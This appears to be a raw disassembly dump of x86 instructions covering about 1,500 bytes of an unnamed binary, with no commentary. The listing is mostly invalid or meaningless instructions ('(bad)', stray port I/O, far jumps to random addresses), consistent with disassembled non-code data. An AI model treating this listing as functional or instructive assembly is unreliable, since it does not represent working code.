  42de52:	jmp    0xe2f8d009
  42de57:	mov    ch,0xc9
  42de59:	mov    edx,0xe3bde5be
  42de5e:	mov    eax,0xd1fadef8
  42de63:	rol    eax,cl
  42de65:	jmp    0x42de70
  42de67:	clc    
  42de68:	(bad)
  42de6c:	(bad)  
  42de6d:	loop   0x42de7b
  42de6f:	rcr    ch,0xd3
  42de72:	out    0xe3,al
  42de74:	leave  
  42de75:	loop   0x42de45
  42de77:	mov    ecx,0xb8e5f3e4
  42de7c:	(bad)  
  42de7e:	add    ebx,ebx
  42de80:	shl    edi,1
  42de82:	add    eax,esi
  42de84:	jmp    0x42de8b
  42de86:	cld    
  42de87:	hlt    
  42de88:	in     eax,0x2
  42de8a:	rol    bl,0xe3
  42de8d:	or     eax,0xa8a8bd0e
  42de92:	enter  0xcef5,0xf1
  42de96:	loopne 0x42de47
  42de98:	cli    
  42de99:	cli    
  42de9a:	enter  0xbff4,0xbd
  42de9e:	idiv   eax
  42dea0:	shl    ebp,0xdb
  42dea3:	pop    es
  42dea4:	add    ecx,esp
  42dea6:	retf   
  42dea7:	retf   
  42dea8:	loope  0x42dea3
  42deaa:	add    esi,esp
  42deac:	dec    DWORD PTR [ebx]
  42deae:	out    dx,al
  42deaf:	shl    eax,0xc6
  42deb2:	fnsave [ecx-0x1e3a1320]
  42deb8:	in     al,dx
  42deb9:	hlt    
  42deba:	out    dx,al
  42debb:	in     al,0xda
  42debd:	mov    ch,0xb8
  42debf:	mov    esp,0xf8c707fc
  42dec4:	add    BYTE PTR [edi+edx*8-0xa211e41],bh
  42decb:	out    0xea,eax
  42decd:	in     eax,dx
  42dece:	int    0xaf
  42ded0:	mov    eax,0xd7f1c1c5
  42ded5:	sti    
  42ded6:	call   0xcef9a7af
  42dedb:	in     eax,0xd3
  42dedd:	iret   
  42dede:	enter  0xbff6,0xcc
  42dee2:	mov    ah,0xc6
  42dee4:	not    dl
  42dee6:	fcom   st(6)
  42dee8:	stc    
  42dee9:	sti    
  42deea:	hlt    
  42deeb:	stc    
  42deec:	retf   
  42deed:	(bad)  
  42deee:	fsub   st,st(4)
  42def0:	test   al,0xac
  42def2:	in     al,dx
  42def3:	ret    
  42def4:	out    dx,al
  42def5:	fcmovnb st,st(6)
  42def7:	into   
  42def8:	(bad)  
  42def9:	sti    
  42defa:	repz int 0xfd
  42defd:	jmp    0xba12bcbd
  42df02:	(bad)  
  42df04:	test   esi,0xcbe003d1
  42df0a:	add    ebx,ebp
  42df0c:	loopne 0x42dee6
  42df0e:	pop    es
  42df0f:	loop   0x42debf
  42df11:	lods   eax,DWORD PTR ds:[esi]
  42df12:	repnz out dx,eax
  42df14:	shl    DWORD PTR [ebx-0x35353415],cl
  42df1a:	hlt    
  42df1b:	aam    0xc8
  42df1d:	sti    
  42df1e:	out    dx,al
  42df1f:	repz icebp 
  42df21:	iret   
  42df22:	aad    0xd3
  42df24:	in     eax,0xb
  42df26:	std    
  42df27:	jmp    esp
  42df29:	std    
  42df2a:	jecxz  0x42df07
  42df2c:	jmp    0x42df17
  42df2e:	in     eax,dx
  42df2f:	in     al,dx
  42df30:	int3   
  42df31:	in     al,0xca
  42df33:	enter  0xf2ca,0xcf
  42df37:	clc    
  42df38:	into   
  42df39:	retf   0xd4be
  42df3c:	icebp  
  42df3d:	mov    edi,0xf8ecf0c9
  42df42:	rcl    cl,0xd1
  42df45:	ret    0xf4f2
  42df48:	(bad)  
  42df49:	jmp    0x42df19
  42df4b:	fadd   QWORD PTR [ecx]
  42df4d:	fst    DWORD PTR [edx]
  42df4f:	test   eax,0xc9d2c5ef
  42df54:	imul   ch
  42df56:	mov    dh,0xe1
  42df58:	stc    
  42df59:	jmp    0x42df2b
  42df5b:	in     eax,0xda
  42df5d:	shl    edx,cl
  42df5f:	fucomi st,st(5)
  42df61:	shl    eax,0xfd
  42df64:	fcomi  st,st(0)
  42df66:	fiadd  DWORD PTR [ebx]
  42df68:	fsubp  st(0),st
  42df6a:	mov    esp,0xc8d8eaeb
  42df6f:	mov    dl,0xf7
  42df71:	rcl    ch,cl
  42df73:	in     al,0xdb
  42df75:	lods   eax,DWORD PTR ds:[esi]
  42df76:	lods   al,BYTE PTR ds:[esi]
  42df77:	fcmovnbe st,st(5)
  42df79:	out    0xbb,al
  42df7b:	imul   bh
  42df7d:	retf   
  42df7e:	(bad)  
  42df7f:	fcmovu st,st(2)
  42df81:	loop   0x42df78
  42df83:	aam    0xdb
  42df85:	mov    ecx,0xead4c2f2
  42df8a:	or     eax,0xfeebdfec
  42df8f:	lock loope 0x42df84
  42df92:	lods   eax,DWORD PTR ds:[esi]
  42df93:	jmp    0x42df4b
  42df95:	shl    DWORD PTR [ebx-0x4f13181a],0xd3
  42df9c:	rcl    ch,1
  42df9e:	(bad)  
  42df9f:	mov    ebx,0xdfd0e3ec
  42dfa4:	add    DWORD PTR ds:0xc6ff06d4,eax
  42dfaa:	out    0x5,eax
  42dfac:	in     eax,0xed
  42dfae:	stc    
  42dfaf:	iret   
  42dfb0:	imul   DWORD PTR [esi+esi*8-0x481b2f3f]
  42dfb7:	mov    cl,0xf8
  42dfb9:	mov    cl,0xe5
  42dfbb:	test   edx,0xe8dcfcd2
  42dfc1:	std    
  42dfc2:	fscale 
  42dfc4:	cmc    
  42dfc5:	mov    esp,0xdccbd1c2
  42dfca:	stc    
  42dfcb:	add    ebx,ebx
  42dfcd:	enter  0xeddc,0xcc
  42dfd1:	jmp    0x42df93
  42dfd3:	out    dx,al
  42dfd4:	mov    dh,0xfa
  42dfd6:	hlt    
  42dfd7:	mov    cl,0xd5
  42dfd9:	aam    0xd4
  42dfdb:	in     eax,dx
  42dfdc:	mov    eax,0xf4bedfdb
  42dfe1:	fcomi  st,st(7)
  42dfe3:	sti    
  42dfe4:	add    edx,edi
  42dfe6:	ret    0xf0b
  42dfe9:	dec    BYTE PTR ds:0xf10d04da
  42dfef:	lods   al,BYTE PTR ds:[esi]
  42dff0:	lods   al,BYTE PTR ds:[esi]
  42dff1:	in     al,0xce
  42dff3:	out    0xe7,al
  42dff5:	out    dx,eax
  42dff6:	(bad)
  42dff9:	jmp    0x42dfc4
  42dffb:	mov    ebx,0xf6f7bae3
  42e000:	fdivp  st(6),st
  42e002:	mov    edi,0xde07badd
  42e007:	sti    
  42e008:	in     eax,0xb
  42e00a:	into   
  42e00b:	out    dx,eax
  42e00c:	out    dx,al
  42e00d:	std    
  42e00e:	fld1   
  42e010:	rcl    cl,cl
  42e012:	out    dx,eax
  42e013:	mov    bl,0xcc
  42e015:	call   0xd50c960b
  42e01a:	std    
  42e01b:	out    dx,eax
  42e01c:	fdivr  DWORD PTR [eax-0x2b1f2f2c]
  42e022:	add    ah,dh
  42e024:	cld    
  42e025:	loop   0x42e01d
  42e027:	pop    es
  42e028:	retf   0xddf4
  42e02b:	or     eax,0xf2fd12c6
  42e030:	repnz enter 0xdcf2,0xe2
  42e035:	mov    ch,0xfb
  42e037:	int3   
  42e038:	retf   
  42e039:	aad    0xc6
  42e03b:	rcl    ch,1
  42e03d:	cld    
  42e03e:	ret    0xfec9
  42e041:	iret   
  42e042:	int    0xdb
  42e044:	inc    DWORD PTR [eax]
  42e046:	pop    es
  42e047:	rol    eax,1
  42e049:	sti    
  42e04a:	into   
  42e04b:	out    dx,al
  42e04c:	jmp    0xe0ac:0xd8d0e5d9
  42e053:	out    dx,al
  42e054:	in     al,0xc6
  42e056:	(bad)
  42e059:	fdiv   DWORD PTR [eax-0x4053122]
  42e05f:	in     eax,dx
  42e060:	loopne 0x42e056
  42e062:	add    eax,0xd0ffe1c0
  42e067:	dec    DWORD PTR [eax]
  42e069:	jecxz  0x42e066
  42e06b:	call   0xe02ad469
  42e070:	mov    cl,0xb3
  42e072:	out    0xb6,al
  42e074:	div    ebx
  42e076:	(bad)  
  42e077:	sti    
  42e078:	out    0xd7,al
  42e07a:	mov    ecx,0xcaddf8de
  42e07f:	clc    
  42e080:	loope  0x42e069
  42e082:	cld    
  42e083:	rol    DWORD PTR [ebx],cl
  42e085:	hlt    
  42e086:	ret    0xdfe6
  42e089:	fadd   st,st(7)
  42e08b:	in     eax,0xee
  42e08d:	iret   
  42e08e:	cli    
  42e08f:	fnstcw WORD PTR [esi-0x2e22093d]
  42e095:	out    dx,al
  42e096:	hlt    
  42e097:	(bad)  
  42e099:	call   0xf818bd56
  42e09e:	(bad)  
  42e09f:	fcmovnu st,st(3)
  42e0a1:	cld    
  42e0a2:	cld    
  42e0a3:	jecxz  0x42e095
  42e0a5:	(bad)  
  42e0a6:	fmul   st,st(2)
  42e0a8:	ret    0xe30f
  42e0ab:	or     BYTE PTR [ebx+eiz*8],cl
  42e0ae:	push   cs
  42e0af:	ret    
  42e0b0:	iret   
  42e0b1:	test   eax,0xdbcdf7c5
  42e0b6:	iret   
  42e0b7:	not    esp
  42e0b9:	aad    0xf7
  42e0bb:	jmp    0xe0e2:0xbff1d7
  42e0c2:	(bad)  
  42e0c3:	repz ret 
  42e0c5:	or     ecx,edx
  42e0c7:	rcr    edi,1
  42e0c9:	fadd   QWORD PTR [ecx]
  42e0cb:	jecxz  0x42e096
  42e0cd:	call   0xdd11b0b7
  42e0d2:	mov    cl,0xef
  42e0d4:	in     al,0xe3
  42e0d6:	int    0xf5
  42e0d8:	in     al,dx
  42e0d9:	fcomp  st(7)
  42e0db:	(bad)  
  42e0dd:	in     al,dx
  42e0de:	mov    esp,0xf5fde8d4
  42e0e3:	fsub   st,st(3)
  42e0e5:	std    
  42e0e6:	(bad)  
  42e0e8:	enter  0xfee1,0xf
  42e0ec:	out    0xdc,al
  42e0ee:	clc    
  42e0ef:	mov    bl,0xaf
  42e0f1:	scas   eax,DWORD PTR es:[edi]
  42e0f2:	rol    eax,cl
  42e0f4:	ret    
  42e0f5:	mov    cl,0xd3
  42e0f7:	clc    
  42e0f8:	cli    
  42e0f9:	mov    ah,0xcf
  42e0fb:	(bad)  
  42e0fd:	idiv   bl
  42e0ff:	aad    0xdc
  42e101:	sar    eax,1
  42e103:	add    eax,0xe0dafcd3
  42e108:	(bad)  
  42e10c:	or     bh,dl
  42e10e:	retf   
  42e10f:	repnz in eax,dx
  42e111:	lods   eax,DWORD PTR ds:[esi]
  42e112:	mov    esp,0xd5b3bcf6
  42e117:	shl    dh,cl
  42e119:	in     al,dx
  42e11a:	mov    bh,0xef
  42e11c:	std    
  42e11d:	sar    esi,1
  42e11f:	add    ecx,eax
  42e121:	out    dx,eax
  42e122:	hlt    
  42e123:	sar    eax,cl
  42e125:	fdivrp st(0),st
  42e127:	rcr    ch,1
  42e129:	add    ecx,esi
  42e12b:	fsubp  st(4),st
  42e12d:	push   cs
  42e12e:	in     al,dx
  42e12f:	retf   0xccb2
  42e132:	call   0xb327cb1f
  42e137:	cli    
  42e138:	clc    
  42e139:	mov    cl,0xd1
  42e13b:	in     al,0xe4
  42e13d:	mov    ch,0x2
  42e13f:	jecxz  0x42e10d
  42e141:	ret    
  42e142:	add    ah,dh
  42e144:	sar    ebp,0xc3
  42e147:	std    
  42e148:	(bad)  
  42e149:	out    0xfd,al
  42e14b:	fldln2 
  42e14d:	out    0x1,eax
  42e14f:	scas   eax,DWORD PTR es:[edi]
  42e150:	lock retf 
  42e152:	enter  0xfbe3,0xd4
  42e156:	(bad)  
  42e157:	rcr    cl,cl
  42e159:	mov    ah,0xe6
  42e15b:	clc    
  42e15c:	retf   0xd0fe
  42e15f:	ror    edi,0xd1
  42e162:	aam    0xe2
  42e164:	rol    DWORD PTR [ecx],1
  42e166:	loop   0x42e16f
  42e168:	loop   0x42e14c
  42e16a:	jmp    0xc28e57b
  42e16f:	test   eax,0xd3c4cce1
  42e174:	in     eax,0xb3
  42e176:	cli    
  42e177:	in     al,0xe5
  42e179:	mov    ebx,0xbad7ccce
  42e17e:	jecxz  0x42e177
  42e180:	lock rcr ebp,cl
  42e183:	icebp  
  42e184:	(bad)  
  42e185:	(bad)
  42e189:	or     dh,ch
  42e18b:	aam    0xd8
  42e18d:	inc    BYTE PTR [ebx]
  42e18f:	stos   DWORD PTR es:[edi],eax
  42e190:	(bad)  
  42e191:	in     eax,0xf1
  42e193:	ror    esi,1
  42e195:	sti    
  42e196:	neg    edx
  42e198:	cmc    
  42e199:	iret   
  42e19a:	mov    bh,0xfd
  42e19c:	mov    ebp,0xf3b7ccea
  42e1a1:	int    0xbc
  42e1a3:	aad    0xff
  42e1a5:	icebp  
  42e1a6:	fadd   st(5),st
  42e1a8:	(bad)
  42e1ab:	aad    0xf9
  42e1ad:	fimul  WORD PTR [eax]
  42e1af:	leave  
  42e1b0:	test   al,0xf3
  42e1b2:	shl    edx,0xb6
  42e1b5:	(bad)  
  42e1b6:	mov    bl,0xf8
  42e1b8:	mov    bh,0xeb
  42e1ba:	hlt    
  42e1bb:	stc    
  42e1bc:	sti    
  42e1bd:	fdivr  st,st(4)
  42e1bf:	add    al,BYTE PTR [ebx]
  42e1c1:	push   es
  42e1c2:	add    dl,cl
  42e1c4:	pop    es
  42e1c5:	aam    0x5
  42e1c7:	in     al,0x2
  42e1c9:	std    
  42e1ca:	fucom  st(2)
  42e1cc:	psubusw mm5,mm5
  42e1cf:	mov    bl,0xc7
  42e1d1:	retf   
  42e1d2:	lods   al,BYTE PTR ds:[esi]
  42e1d3:	lock test edi,0xdeefb3b5
  42e1da:	xlat   BYTE PTR ds:[ebx]
  42e1db:	in     al,dx
  42e1dc:	mov    edx,0xbffb03f8
  42e1e1:	add    DWORD PTR ds:0xe3e0d2d3,eax
  42e1e7:	add    al,0xe4
  42e1e9:	ror    DWORD PTR [edi],0xd
  42e1ec:	inc    BYTE PTR [esi]
  42e1ee:	add    ecx,eax
  42e1f0:	enter  0xf3b3,0xc8
  42e1f4:	iret   
  42e1f5:	lods   eax,DWORD PTR ds:[esi]
  42e1f6:	out    dx,eax
  42e1f7:	loopne 0x42e1f8
  42e1f9:	shl    DWORD PTR [ebp-0x34a352e],1
  42e1ff:	aad    0xe2
  42e201:	out    dx,al
  42e202:	int3   
  42e203:	add    eax,edi
  42e205:	or     al,dh
  42e207:	out    0xc8,eax
  42e209:	add    bl,cl
  42e20b:	fimul  DWORD PTR [esi]
  42e20d:	or     cl,BYTE PTR [edx]
  42e20f:	in     al,dx
  42e210:	lock ror bh,1
  42e213:	(bad)  
  42e214:	imul   edx
  42e216:	icebp  
  42e217:	fcomi  st,st(6)
  42e219:	mov    edi,0xcdf3f0bf
  42e21e:	fild   WORD PTR [ebx]
  42e220:	(bad)  
  42e222:	jecxz  0x42e1e9
  42e224:	(bad)  
  42e225:	repnz dec BYTE PTR [edx]
  42e228:	sti    
  42e229:	or     BYTE PTR [ecx+ecx*8],al
  42e22c:	cld    
  42e22d:	or     dh,bl
  42e22f:	ror    bh,0xa9
  42e232:	fdiv   QWORD PTR [ebx-0x13140f29]
  42e238:	aam    0xfb
  42e23a:	sar    edi,1
  42e23c:	(bad)  
  42e23d:	out    dx,al
  42e23e:	fcmovbe st,st(3)
  42e240:	rol    DWORD PTR [ecx],cl
  42e242:	icebp  
  42e243:	add    eax,0xd702d2e7
  42e248:	ret    0xc9dc
  42e24b:	clc    
  42e24c:	or     DWORD PTR ds:0xbcc3d1fd,eax
  42e252:	lods   eax,DWORD PTR ds:[esi]
  42e253:	hlt    
  42e254:	(bad)  
  42e255:	leave  
  42e256:	iret   
  42e257:	mov    cl,0xb6
  42e259:	out    0xcc,al
  42e25b:	sar    eax,1
  42e25d:	jmp    0xe01ad220
  42e262:	test   edi,0xddddf3f5
  42e268:	fcmovu st,st(6)
  42e26a:	out    dx,al
  42e26b:	jmp    0xd7cb:0xa711d3db
  42e272:	test   edx,0xe9cef1d1
  42e278:	mov    ebx,0xb2efeede
  42e27d:	cmc    
  42e27e:	hlt    
  42e27f:	fucomp st(4)
  42e281:	out    dx,eax
  42e282:	(bad)  
  42e283:	add    esi,eax
  42e285:	fcomip st,st(7)
  42e287:	shr    ebx,0xdb
  42e28a:	fdiv   st(7),st
  42e28c:	sti    
  42e28d:	std    
  42e28e:	into   
  42e28f:	(bad)  
  42e291:	out    dx,al
  42e292:	call   0xf52c917e
  42e297:	int    0xcb
  42e299:	fcmovu st,st(5)
  42e29b:	cld    
  42e29c:	aam    0xd7
  42e29e:	clc    
  42e29f:	fadd   QWORD PTR [edx]
  42e2a1:	ret    
  42e2a2:	fdiv   st,st(7)
  42e2a4:	(bad)  
  42e2a6:	fcomip st,st(7)
  42e2a8:	(bad)  
  42e2a9:	fucomip st,st(2)
  42e2ab:	psubq  mm0,QWORD PTR [esi]
  42e2ae:	(bad)  
  42e2b0:	int    0xcb
  42e2b2:	mov    bl,0xe3
  42e2b4:	int    0xfb
  42e2b6:	lock int3 
  42e2b8:	jmp    0xc2f9:0xf4b3fed5
  42e2bf:	rol    BYTE PTR [edx],cl
  42e2c1:	(bad)  
  42e2c2:	in     eax,dx
  42e2c3:	cli    
  42e2c4:	repz fucomp st(2)
  42e2c7:	cld    
  42e2c8:	(bad)
  42e2cb:	dec    al
  42e2cd:	add    ah,ah
  42e2cf:	jecxz  0x42e2ba
  42e2d1:	out    dx,eax
  42e2d2:	retf   0xadf6
  42e2d5:	cli    
  42e2d6:	(bad)  
  42e2d7:	shl    esp,0xd2
  42e2da:	mov    ebx,0xf6f7c9e9
  42e2df:	aad    0xd8
  42e2e1:	out    dx,eax
  42e2e2:	mov    BYTE PTR [ebx],0x0
  42e2e5:	fcmovb st,st(3)
  42e2e7:	loop   0x42e2d9
  42e2e9:	fcmovnb st,st(0)
  42e2eb:	cli    
  42e2ec:	retf   
  42e2ed:	leave  
  42e2ee:	adc    DWORD PTR [ecx-0x1d221413],ebp
  42e2f4:	in     eax,dx
  42e2f5:	mov    dh,0xb5
  42e2f7:	ror    al,0xd2
  42e2fa:	(bad)  
  42e2fb:	not    ch
  42e2fd:	fiadd  WORD PTR [ebx]
  42e2ff:	hlt    
  42e300:	clc    
  42e301:	iret   
  42e302:	rcr    bl,cl
  42e304:	pop    es
  42e305:	rcl    bh,cl
  42e307:	hlt    
  42e308:	rcr    ebx,0xf4
  42e30b:	or     al,0xed
  42e30d:	repz rcl al,cl
  42e310:	mov    dl,0xdf
  42e312:	lods   eax,DWORD PTR ds:[esi]
  42e313:	int    0xc8
  42e315:	mov    ch,0xd2
  42e317:	aam    0xd4
  42e319:	out    dx,eax
  42e31a:	jmp    0x42e301
  42e31c:	shr    esp,1
  42e31e:	iret   
  42e31f:	cmc    
  42e320:	call   0x403b5e6
  42e325:	add    ecx,eax
  42e327:	in     eax,0xe0
  42e329:	(bad)  
  42e32a:	(bad)  
  42e32b:	in     al,dx
  42e32c:	jmp    0xc304ea2b
  42e331:	repnz out dx,al
  42e333:	(bad)  
  42e334:	icebp  
  42e335:	int    0xd0
  42e337:	ror    dh,1
  42e339:	(bad)  
  42e33b:	cmc    
  42e33c:	hlt    
  42e33d:	jmp    0xe3d1:0xc7dee3ff
  42e344:	loope  0x42e32c
  42e346:	or     cl,BYTE PTR [ecx]
  42e348:	jmp    0x3e6:0xea00e7e7
  42e34f:	leave  
  42e350:	ret    
  42e351:	lods   eax,DWORD PTR ds:[esi]
  42e352:	mov    ebp,0xe6d3e8cc
  42e357:	jmp    0xb517b946
  42e35c:	leave  
  42e35d:	not    esi
  42e35f:	iret   
  42e360:	int    0x1
  42e362:	cli    
  42e363:	mov    esi,0x807fae2
  42e368:	std    
  42e369:	enter  0xc6fa,0x2
  42e36d:	repnz retf 0xeae8
  42e371:	out    dx,eax
  42e372:	enter  0xb4c4,0xb2
  42e376:	les    esi,FWORD PTR [esi-0x4122716]
  42e37c:	mov    ebx,0xdcf4e9d2
  42e381:	out    dx,eax
  42e382:	int    0xe7
  42e384:	std    
  42e385:	icebp  
  42e386:	(bad)  
  42e388:	aam    0xf5
  42e38a:	or     eax,0x3efc5c3
  42e38f:	jmp    0x42e34d
  42e391:	(bad)  
  42e392:	in     al,dx
  42e393:	(bad)
  42e396:	enter  0xe8b9,0xcb
  42e39a:	xlat   BYTE PTR ds:[ebx]
  42e39b:	call   0xd733c15e
  42e3a0:	jecxz  0x42e376
  42e3a2:	inc    bh
  42e3a4:	(bad)  
  42e3a5:	idiv   eax
  42e3a7:	lock faddp st(7),st
  42e3aa:	out    dx,eax
  42e3ab:	fcom   st(4)
  42e3ad:	int3   
  42e3ae:	loop   0x42e395
  42e3b0:	out    dx,eax
  42e3b1:	mov    bh,0xc9
  42e3b3:	leave  
  42e3b4:	jmp    0x42e37c
  42e3b6:	icebp  
  42e3b7:	iret   
  42e3b8:	retf   0xd6ea
  42e3bb:	push   DWORD PTR [esi-0xb482024]
  42e3c1:	pop    es
  42e3c2:	sar    cl,1
  42e3c4:	out    0xe1,eax
  42e3c6:	or     edi,ebp
  42e3c8:	stc    
  42e3c9:	push   es
  42e3ca:	fcmovb st,st(6)
  42e3cc:	lds    ecx,FWORD PTR [ebx]
  42e3ce:	fld    st(3)
  42e3d0:	fcomip st,st(3)
  42e3d2:	ffree  st(4)
  42e3d4:	repz test eax,0xe9eaeef6
  42e3da:	fucomp st(5)
  42e3dc:	call   0x237d5a4
  42e3e1:	(bad)  
  42e3e2:	int    0xe7
  42e3e4:	aad    0xd1
  42e3e6:	mov    BYTE PTR [eax+ecx*8],0xfa
  42e3ea:	or     esp,esi
  42e3ec:	add    ebx,ebp
  42e3ee:	add    eax,ebx
  42e3f0:	sar    DWORD PTR [edi-0x1f241d52],0xe9
  42e3f7:	shl    eax,0xbb
  42e3fa:	aam    0xf0
  42e3fc:	enter  0xf102,0xf8
  42e400:	call   0xc20498dc
  42e405:	(bad)  
  42e407:	loopne 0x42e40c
  42e409:	loopne 0x42e3e9
  42e40b:	into   
  42e40c:	les    ecx,FWORD PTR [esi+ebx*8]
  42e40f:	call   0xb434b3f2
  42e414:	call   0xd9f79afb
  42e419:	(bad)  
  42e41a:	aam    0xce
  42e41c:	leave  
  42e41d:	mov    edi,0xd9ced7ed
  42e422:	int3   
  42e423:	ret    
  42e424:	cmc    
  42e425:	add    dl,dh
  42e427:	or     cl,al
  42e429:	sti    
  42e42a:	std    
  42e42b:	int    0xeb
  42e42d:	dec    ch
  42e42f:	out    0xe6,eax
  42e431:	scas   eax,DWORD PTR es:[edi]
  42e432:	out    0xb1,al
  42e434:	repnz imul ecx
  42e437:	leave  
  42e438:	in     al,dx
  42e439:	(bad)  
  42e43b:	fnstsw WORD PTR [ecx-0x26124137]
  42e441:	cli    
  42e442:	div    bl
  42e444:	sar    ecx,cl
  42e446:	or     esp,ebp
  42e448:	aam    0x5
  42e44a:	add    eax,0xe5ecda02
  42e44f:	lods   eax,DWORD PTR ds:[esi]
  42e450:	retf   
  42e451:	rcl    dl,1
  42e453:	mov    dl,0xf2
  42e455:	int    0xc1
  42e457:	in     al,dx
  42e458:	cli    
  42e459:	in     al,dx
  42e45a:	neg    ecx
  42e45c:	retf   
  42e45d:	in     eax,dx
  42e45e:	mov    ecx,0xf3c2da
  42e463:	xlat   BYTE PTR ds:[ebx]
  42e464:	sar    ebp,0x5
  42e467:	aad    0xfd
  42e469:	(bad)  
  42e46a:	(bad)  
  42e46b:	jmp    0xf02ec478
  42e470:	loop   0x42e451
  42e472:	mov    bh,0xdd
  42e474:	hlt    
  42e475:	loope  0x42e45b
  42e477:	mov    ebx,0xe8d8d7ce
  42e47c:	(bad)  
  42e47d:	fistp  QWORD PTR [edx-0x7322c3f]
  42e483:	cmc    
  42e484:	ret    
  42e485:	(bad)
  42e488:	fucom  st(2)
  42e48a:	into   
  42e48b:	push   es
  42e48c:	out    0x9,eax
  42e48e:	fyl2x  
  42e490:	jmp    0xb7c7:0xf5c7b1cd
  42e497:	(bad)  
  42e499:	into   
  42e49a:	jmp    0xf13cbe8b
  42e49f:	mov    ebx,0xd2fbfbbd
  42e4a4:	aad    0xe3
  42e4a6:	add    esp,esp
  42e4a8:	out    0xf7,al
  42e4aa:	or     ah,al
  42e4ac:	or     ah,ch
  42e4ae:	repz (bad) 
  42e4b0:	icebp  
  42e4b1:	mov    ebp,0xc4bcb0b7
  42e4b6:	not    dl
  42e4b8:	sti    
  42e4b9:	sar    BYTE PTR [edi-0x21252627],cl
  42e4bf:	shl    bl,cl
  42e4c1:	fsub   st,st(1)
  42e4c3:	rcr    al,1
  42e4c5:	add    bh,bl
  42e4c7:	leave  
  42e4c8:	bswap  ecx
  42e4ca:	cli    
  42e4cb:	add    al,0xd8
  42e4cd:	repz clc 
  42e4cf:	retf   
  42e4d0:	fadd   st(4),st
  42e4d2:	retf   
  42e4d3:	out    dx,eax
  42e4d4:	into   
  42e4d5:	mov    cl,0xcd
  42e4d7:	loopne 0x42e490
  42e4d9:	cli    
  42e4da:	retf   
  42e4db:	mov    ebx,0xbbd7ebcb
  42e4e0:	(bad)  
  42e4e1:	ret    
  42e4e2:	mul    cl
  42e4e4:	in     al,dx
  42e4e5:	cld    
  42e4e6:	ret    0xd0c7
  42e4e9:	fcmovu st,st(2)
  42e4eb:	sti    
  42e4ec:	cli    
  42e4ed:	std    
  42e4ee:	loop   0x42e4d5
  42e4f0:	int    0xf0
  42e4f2:	test   al,0xd4
  42e4f5:	mov    bl,0xd6
  42e4f7:	stc    
  42e4f8:	ror    ebp,cl
  42e4fa:	mov    bh,0xfe
  42e4fc:	repz lock aam 0xec
  42e500:	cmc    
  42e501:	add    esp,esi
  42e503:	neg    ebx
  42e505:	ret    0xbffd
  42e508:	aam    0xe9
  42e50a:	std    
  42e50b:	push   cs
  42e50c:	in     eax,0xea
  42e50e:	add    ch,dh
  42e510:	lods   eax,DWORD PTR ds:[esi]
  42e511:	mov    bl,0xc9
  42e513:	(bad)
  42e516:	stc    
  42e517:	shl    ebp,cl
  42e519:	retf   
  42e51a:	shl    DWORD PTR [esi+edx*8-0xe02040c],1
  42e521:	cli    
  42e522:	ffree  st(7)
  42e524:	pop    es
  42e525:	add    al,0xc0
  42e527:	jmp    0xfc21eb0e
  42e52c:	loop   0x42e534
  42e52e:	fucomp st(0)
  42e530:	lods   eax,DWORD PTR ds:[esi]
  42e531:	repz jmp 0xebe6:0xf9cfc4d2
  42e539:	(bad)  
  42e53b:	mov    edx,0xf9d2f2e3
  42e540:	add    ecx,esi
  42e542:	cld    
  42e543:	fdivp  st(3),st
  42e545:	cli    
  42e546:	loop   0x42e50b
  42e548:	push   es
  42e549:	xlat   BYTE PTR ds:[ebx]
  42e54a:	jecxz  0x42e529
  42e54c:	(bad)  
  42e54e:	retf   
  42e54f:	icebp  
  42e550:	icebp  
  42e551:	repnz mov bl,0xf6
  42e554:	shl    al,0xf5
  42e557:	in     al,dx
  42e558:	rol    edi,cl
  42e55a:	hlt    
  42e55b:	in     al,0xdf
  42e55d:	aad    0xb0
  42e55f:	jmp    0xf614c82c
  42e564:	(bad)  
  42e565:	cmc    
  42e566:	add    edi,ebx
  42e568:	sti    
  42e569:	ror    cl,0xed
  42e56c:	or     eax,0xb0e3e100
  42e571:	mov    ah,0xf1
  42e574:	div    bh
  42e576:	lods   al,BYTE PTR ds:[esi]
  42e577:	aam    0xc6
  42e579:	call   esp
  42e57b:	icebp  
  42e57c:	enter  0x3d8,0xd7
  42e580:	mov    ecx,0xd2c5fcbd
  42e585:	cli    
  42e586:	in     al,0xe2
  42e588:	std    
  42e589:	add    ch,dh
  42e58b:	clc    
  42e58c:	out    dx,eax
  42e58d:	fcomp  st(2)
  42e58f:	les    ebp,FWORD PTR [esi+edx*8-0x324e2b16]
  42e596:	loopne 0x42e56e
  42e598:	div    cl
  42e59a:	fucomip st,st(0)
  42e59c:	in     al,dx
  42e59d:	fcomp  st(0)
  42e59f:	icebp  
  42e5a0:	aam    0xd6
  42e5a2:	add    bl,ch
  42e5a4:	(bad)  
  42e5a6:	cld    
  42e5a7:	aam    0xc2
  42e5a9:	jmp    0xeddd:0xee09e8f5
  42e5b0:	out    0xed,eax
  42e5b2:	int    0xc5
  42e5b4:	ret    0xe7e0
  42e5b7:	div    edi
  42e5b9:	(bad)  
  42e5ba:	icebp  
  42e5bb:	mov    bl,0xc8
  42e5bd:	fdivr  DWORD PTR [edi+edi*4-0x131d470d]
  42e5c4:	add    al,0xf8
  42e5c6:	sar    dl,cl
  42e5c8:	or     DWORD PTR [ecx+ebp*8],eax
  42e5cb:	mov    DWORD PTR ds:0xe4aad3df,0xd6c7eee1
  42e5d5:	in     al,0xf2
  42e5d7:	repnz idiv DWORD PTR [ebx-0x41171328]
  42e5de:	ret    0xd3bc
  42e5e1:	(bad)  
  42e5e3:	(bad)  
  42e5e5:	clc    
  42e5e6:	jmp    0x651ccd1
  42e5eb:	out    dx,al
  42e5ec:	fcmove st,st(4)
  42e5ee:	int3   
  42e5ef:	mov    bl,0xc3
  42e5f1:	retf   
  42e5f2:	out    0xca,eax
  42e5f4:	lock (bad) 
  42e5f7:	icebp  
  42e5f8:	scas   al,BYTE PTR es:[edi]
  42e5f9:	jmp    0xdec9:0xbbf8b3df
  42e600:	mov    eax,0xe1df01be
  42e605:	shl    al,1
  42e607:	add    eax,DWORD PTR [edx]
  42e609:	ror    BYTE PTR [edx],0x9
  42e60c:	in     al,0xe2
  42e60e:	add    ah,bl
  42e610:	jmp    0xef20cde0
  42e615:	shl    bh,1
  42e617:	out    dx,eax
  42e618:	retf   
  42e619:	mov    bh,0xe8
  42e61b:	mov    ah,0xda
  42e61d:	in     al,dx
  42e61e:	aad    0xd0
  42e620:	mov    ecx,0xc4f9edf4
  42e625:	rol    ebp,0xc1
  42e628:	test   DWORD PTR [eax],0xeddcfed5
  42e62e:	int3   
  42e62f:	jmp    0xd82fcedc
  42e634:	in     eax,dx
  42e635:	sti    
  42e636:	enter  0xbafa,0xc8
  42e63a:	iret   
  42e63b:	mov    edx,0xfde3d6ce
